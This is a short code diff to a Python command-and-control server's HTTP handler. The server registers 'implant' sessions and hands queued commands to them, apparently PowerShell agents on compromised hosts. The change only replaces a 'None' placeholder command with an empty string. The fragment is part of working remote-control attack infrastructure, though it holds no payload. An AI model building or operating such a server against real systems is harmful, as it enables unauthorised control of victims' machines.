@@ -39,7 +39,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         path = self.path.strip("/")
         with global_lock:
             if uid not in http_sessions:
-                http_sessions[uid] = {"last_cmd": "None", "output": "", "last_seen": time.time(), "cwd": None}
+                http_sessions[uid] = {"last_cmd": "", "output": "", "last_seen": time.time(), "cwd": None}
                 sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                 sys.stdout.flush()
             http_sessions[uid]["last_seen"] = time.time()
@@ -51,8 +51,8 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             command_fetch_path = parts[1]
             if path == command_fetch_path:
                 with global_lock:
-                    cmd = http_sessions[uid].get("last_cmd", "None")
-                    http_sessions[uid]["last_cmd"] = "None"
+                    cmd = http_sessions[uid].get("last_cmd", "")
+                    http_sessions[uid]["last_cmd"] = ""
                 # Send newline so PowerShell treats combined commands as a full line
                 self.wfile.write((cmd + "\n").encode())
                 return
